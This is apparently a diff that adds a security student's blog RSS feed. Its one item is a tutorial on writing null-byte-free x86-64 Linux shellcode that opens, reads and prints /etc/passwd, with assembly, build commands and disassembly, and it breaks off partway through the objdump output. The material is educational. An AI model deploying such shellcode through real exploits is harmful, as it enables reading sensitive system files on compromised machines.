@@ -1,0 +1,323 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>quentin meffre</title>
+		<description>Computer science student, passionate about Cyber Security.</description>
+		<link>/</link>
+		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
+		
+			<item>
+				<title>Basic Shellcode</title>
+				<description>&lt;h1 id=&quot;1-surroundings&quot;&gt;1. Surroundings&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;uname &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+Linux debian 3.16.0-4-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+No LSB modules are available.
+Distributor ID:	Debian
+Description:	Debian GNU/Linux 8.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jessie&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Release:	8.7
+Codename:	jessie
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian 4.9.2-10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4.9.2
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+NASM version 2.11.05 compiled on Sep  9 2014
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+GNU ld &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU Binutils &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2.25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;2-explanation&quot;&gt;2. Explanation&lt;/h1&gt;
+
+&lt;p&gt;This is the first post of a little series concerning differents shellcode types. This first post will show you the most basic shellcode that exist. Writting shellcode is an very advanced art which need advanced assembly knowledge. The example I will show you isn’t the most optimized but I’am the one who wrote it! Last thing before begin, this post will not explain to you the shellcode definition (because there are a lot of tutorial on internet) but I will show you an example of shellcode writting from A to Z.&lt;/p&gt;
+
+&lt;p&gt;To write the shellcode, I will use the Intel syntax because I prefer it compare to AT&amp;amp;T syntax.&lt;/p&gt;
+
+&lt;p&gt;Our shellcode goal will be to read the “/etc/passwd”. To do it we will not use “execve” syscall (to add a bit of difficulty) but we will use “open/read/write” syscall!&lt;/p&gt;
+
+&lt;p&gt;In C language, our shellcode will look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we will translate this code in ASM x64 with the shellcode condition!&lt;/p&gt;
+
+&lt;h1 id=&quot;3-shellcode-writting&quot;&gt;3. Shellcode writting&lt;/h1&gt;
+&lt;p&gt;So we first call a function and define our file path under the call to pop its value in the future register.&lt;/p&gt;
+
+&lt;p&gt;To remind, the “open” syscall is defined like:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the register value will look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;syscall number, get from &lt;span class=&quot;s2&quot;&gt;&quot;/usr/include/asm/unistd_64.h&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;RAX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1st argument&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                            &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;RDI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/etc/passwd&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2nd argument&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                            &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;RSI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0000&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The code for the open syscall will look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;                      &lt;span class=&quot;c&quot;&gt;; Jump to the first label&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;                     &lt;span class=&quot;c&quot;&gt;; We pop the define string (file) in RDI&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; We set the last character of the path to &quot;\0&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;                 &lt;span class=&quot;c&quot;&gt;; We set 2 in al (the down part of AX, also the down part of EAX and also of RAX)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;                &lt;span class=&quot;c&quot;&gt;; We set RSI to 0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;                     &lt;span class=&quot;c&quot;&gt;; We call the main function&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/etc/passwdA&quot;&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We define the file string (the A at end is for the future &quot;\0&quot;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next steps will be to read the content of the file descriptor return by the previous open syscall, display it on the standard output, and then exit the program. This part is very easy so I will not detail it a lot.
+To remind, the syscalls definition we will need look like:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then the code to do it.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We move the fd get from &quot;open&quot; to RDI&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rsp]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; We load the content of RSP to RSI&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; We set RDX to 4095&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We set RAX to 0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We set dil (down part of DI, EDI, RDI) to 1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We set rdx to the data size we get from read syscall&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; We set al to 1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3c&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; We set RAX to 60 (exit syscall number)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;4-the-shellcode&quot;&gt;4. The shellcode&lt;/h1&gt;
+&lt;p&gt;The whole shellcode will look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;_start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[rsp]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3c&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;syscall&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;L1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L2&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;db&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/etc/passwdA&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we will assemble, compile and check the shellcode opcodes to see if there is “00” bytes.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nasm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; elf64 shellcode.s &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.o
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ld &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode shellcode.o             
+ld: warning: cannot find entry symbol _start&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; defaulting to 0000000000400080
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; shellcode
+
+shellcode:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 &amp;lt;_start&amp;gt;:
+  400080:	eb 39                	jmp    4000bb &amp;lt;L1&amp;gt;
+
+0000000000400082 &amp;lt;L2&amp;gt;:
+  400082:	5f                   	pop    %rdi
+  400083:	80 77 0b 41          	xorb   &lt;span class=&quot;nv&quot;&gt;$0x41&lt;/span&gt;,0xb&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rdi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  400087:	48 31 c0             	xor    %rax,%rax
+  40008a:	04 02                	add    &lt;span class=&quot;nv&quot;&gt;$0x2&lt;/span&gt;,%al
+  40008c:	48 31 f6             	xor    %rsi,%rsi
+  40008f:	0f 05                	syscall 
+  400091:	48 89 c7             	mov    %rax,%rdi
+  400094:	48 8d 34 24          	lea    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%rsp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%rsi
+  400098:	48 31 d2             	xor    %rdx,%rdx
+  40009b:	66 ba ff 0f          	mov    &lt;span class=&quot;nv&quot;&gt;$0xfff&lt;/span&gt;,%dx
+  40009f:	48 31 c0             	xor    %rax,%rax
+  4000a2:	0f 05                	syscall 
+  4000a4:	48 31 ff             	xor    %rdi,%rdi
+  4000a7:	40 b7 01             	mov    &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,%dil
+  4000aa:	48 89 c2             	mov    %rax,%rdx
+  4000ad:	48 31 c0             	xor    %rax,%rax
+  4000b0:	b0 01                	mov    &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,%al
+  4000b2:	0f 05                	syscall 
+  4000b4:	48 31 c0             	xor    %rax,%rax
+  4000b7:	b0 3c                	mov    &lt;span class=&quot;nv&quot;&gt;$0x3c&lt;/span&gt;,%al
+  4000b9:	0f 05                	syscall 
+
+00000000004000bb &amp;lt;L1&amp;gt;:
+  4000bb:	e8 c2 ff ff ff       	callq  400082 &amp;lt;L2&amp;gt;
+
+00000000004000c0 &amp;lt;file&amp;gt;:
+  4000c0:	2f                   	&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bad&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
